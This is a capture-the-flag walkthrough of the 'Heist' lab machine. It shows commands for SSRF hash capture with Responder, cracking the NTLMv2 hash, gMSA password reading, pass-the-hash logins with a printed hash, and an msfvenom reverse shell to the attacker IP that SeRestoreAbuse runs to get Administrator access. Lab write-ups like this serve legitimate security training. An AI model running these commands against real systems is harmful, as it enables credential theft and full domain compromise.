---
icon: windows
---

# Heist - Hard

## <mark style="color:blue;">Gaining Access</mark>

Nmap scan:

```
# Nmap TCP
nmap -A -T4 -p- -Pn 192.168.225.165 -oN scans/nmap-tcpall
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-30 14:06 EDT
Nmap scan report for 192.168.225.165
Host is up (0.030s latency).
Not shown: 65514 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-09-30 18:08:14Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: heist.offsec0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: heist.offsec0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: HEIST
|   NetBIOS_Domain_Name: HEIST
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: heist.offsec
|   DNS_Computer_Name: DC01.heist.offsec
|   DNS_Tree_Name: heist.offsec
|   Product_Version: 10.0.17763
|_  System_Time: 2025-09-30T18:09:08+00:00
| ssl-cert: Subject: commonName=DC01.heist.offsec
| Not valid before: 2025-09-29T18:05:43
|_Not valid after:  2026-03-31T18:05:43
|_ssl-date: 2025-09-30T18:09:47+00:00; +2s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
8080/tcp  open  http          Werkzeug httpd 2.0.1 (Python 3.9.0)
|_http-server-header: Werkzeug/2.0.1 Python/3.9.0
|_http-title: Super Secure Web Browser
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  msrpc         Microsoft Windows RPC
49703/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (92%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (92%), Microsoft Windows 10 1903 - 21H1 (85%), Microsoft Windows 10 1607 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-09-30T18:09:12
|_  start_date: N/A
|_clock-skew: mean: 1s, deviation: 0s, median: 1s

TRACEROUTE (using port 3389/tcp)
HOP RTT      ADDRESS
1   29.08 ms 192.168.45.1
2   28.73 ms 192.168.45.254
3   32.09 ms 192.168.251.1
4   32.07 ms 192.168.225.165
```

The nmap scan shows the domain names of heist.offsec DC01.heist.offsec. I'll add them to my /etc/hosts/ file

```
192.168.225.165	heist.offsec DC01.heist.offsec
```

### <mark style="color:$primary;">HTTP Port 8080 TCP</mark>

The website seems to take a url as payload I am going to setup a simple python http server and have it reach out to my machine.

<figure><img src="../../.gitbook/assets/image (2240).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2241).png" alt=""><figcaption></figcaption></figure>

It does reach out! We should be able to grab the hash via SSRF using responder.&#x20;

### <mark style="color:$primary;">SSRF</mark>

Have responder ready:

```
sudo responder -I tun0
```

<figure><img src="../../.gitbook/assets/image (2242).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2243).png" alt=""><figcaption></figcaption></figure>

I am going to save the hash and try to crack it!

### <mark style="color:$primary;">Cracking NTLMv2 Hash</mark>

```
hashcat enox-ntlmv2.hash /usr/share/wordlists/rockyou.txt
```

```
hashcat enox-ntlmv2.hash /usr/share/wordlists/rockyou.txt --show
```

<figure><img src="../../.gitbook/assets/image (2244).png" alt=""><figcaption></figcaption></figure>

```
netexec smb heist.offsec -u enox -p california --shares
```

<figure><img src="../../.gitbook/assets/image (2245).png" alt=""><figcaption></figcaption></figure>

The creds work! Since I got a hold of some credentials I am going to do bloodhound collection using netexec and check to see what this user can do!

### <mark style="color:$primary;">Bloodhound</mark>

```
netexec ldap 192.168.225.165 -u enox -p california --bloodhound --collection All --dns-server 192.168.225.165
```

<figure><img src="../../.gitbook/assets/image (2246).png" alt=""><figcaption></figcaption></figure>

I am going to start bloodhound and take a look:

```
sudo neo4j start
bloodhound
```

<figure><img src="../../.gitbook/assets/image (2247).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2248).png" alt=""><figcaption></figcaption></figure>

Enox is in the web admins group and they have READGMSAPassword! Let's see if enox has winrm access to grab svc\_apache's hash

```
netexec winrm heist.offsec -u enox -p california
```

<figure><img src="../../.gitbook/assets/image (2249).png" alt=""><figcaption></figcaption></figure>

We have winrm access, let's get a shell on the machine!

```
evil-winrm -i heist.offsec -u enox -p california
```

<figure><img src="../../.gitbook/assets/image (2254).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:$primary;">ReadGMSAPassword</mark>

<figure><img src="../../.gitbook/assets/image (2251).png" alt=""><figcaption></figcaption></figure>

To get svc\_apache@ password I am going to use [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)&#x20;

```
iwr -uri http://192.168.45.158/GMSAPasswordReader.exe -outfile GMSAPasswordReader.exe
```

```
.\GMSAPasswordReader.exe --accountname svc_apache$
```

<figure><img src="../../.gitbook/assets/image (2252).png" alt=""><figcaption></figcaption></figure>

```
evil-winrm -i heist.offsec -u 'svc_apache$' -H 7871BA7E758E95DA77F34B1822C0878C
```

<figure><img src="../../.gitbook/assets/image (2256).png" alt=""><figcaption></figcaption></figure>

Nice we got a shell as svc\_apache$ and we already see potential for privilesc escalation with SeRestorePrivilege

## <mark style="color:blue;">Privilege Escalation</mark>

### <mark style="color:$primary;">SeRestorePrivilege</mark>

In order to exploit this privilege we are going to need this [**executable**](https://github.com/dxnboy/redteam/blob/master/SeRestoreAbuse.exe) and we need to generate a malicious reverse shell that we will have SeRestoreAbuse.exe execute to give us a shell as Administrator

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.158 LPORT=135 -f exe -o reverse.exe
```

<figure><img src="../../.gitbook/assets/image (2255).png" alt=""><figcaption></figcaption></figure>

Now that I have both files ready I will upload them

<figure><img src="../../.gitbook/assets/image (2257).png" alt=""><figcaption></figcaption></figure>

Now make sure youy ave your listener ready, and then execute the following command:

```
.\SeRestoreAbuse.exe C:\Users\svc_apache$\Documents\reverse.exe
```

<figure><img src="../../.gitbook/assets/image (2258).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2259).png" alt=""><figcaption></figcaption></figure>

And we got a shell as administrator! This box was actually not that hard.
